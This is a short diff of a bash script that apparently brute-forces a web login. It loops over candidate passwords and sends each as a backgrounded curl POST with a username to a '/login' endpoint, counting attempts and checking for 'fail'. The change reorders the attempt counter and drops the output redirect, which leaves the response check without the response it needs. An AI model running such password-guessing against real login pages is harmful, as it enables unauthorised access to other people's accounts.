@@ -95,10 +95,11 @@ begin(){
 
 		[[ -z "$pass" ]] && continue
 
-		curl -s -X Post "$url/login" -d "username=$user&password=$pass" 1> response.txt &
+		((attempts++))
+
+		curl -s -X Post "$url/login" -d "username=$user&password=$pass" &
 
 		pid=$!
-		((attempts++))
 
 		if [[ "$response" == *fail* ]]; then
 
